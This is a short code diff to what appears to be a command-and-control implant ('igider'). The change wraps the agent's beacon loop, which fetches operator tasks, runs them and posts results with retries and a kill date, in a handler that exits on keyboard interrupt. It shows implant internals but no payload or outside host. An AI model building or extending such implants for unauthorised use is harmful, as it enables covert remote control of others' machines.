@@ -325,29 +325,33 @@ CRYPTO_MODULE_PLACEHOLDER
         else:
             os._exit(1)
 
-        while True:
-                if self.passedKilldate():
-                    self.exit(0)
-                try:
-                    self.getTaskings()
-                    self.processTaskings()
-                    self.postResponses()
-                except Exception as e:
-                    # Retry tasking operations for a limited time
-                    max_task_retries = 5
-                    task_retry_delay = 10
-                    for attempt in range(max_task_retries):
-                        try:
-                            self.getTaskings()
-                            self.processTaskings()
-                            self.postResponses()
-                            break
-                        except Exception as e2:
-                            if attempt < max_task_retries - 1:
-                                time.sleep(task_retry_delay)
-                    else:
-                        pass
-                self.agentSleep()                  
+        try:
+
+            while True:
+                    if self.passedKilldate():
+                        self.exit(0)
+                    try:
+                        self.getTaskings()
+                        self.processTaskings()
+                        self.postResponses()
+                    except Exception as e:
+                        # Retry tasking operations for a limited time
+                        max_task_retries = 5
+                        task_retry_delay = 10
+                        for attempt in range(max_task_retries):
+                            try:
+                                self.getTaskings()
+                                self.processTaskings()
+                                self.postResponses()
+                                break
+                            except Exception as e2:
+                                if attempt < max_task_retries - 1:
+                                    time.sleep(task_retry_delay)
+                        else:
+                            pass
+                    self.agentSleep()   
+        except KeyboardInterrupt:
+            self.exit(0)               
 
 if __name__ == "__main__":
     igider = igider()
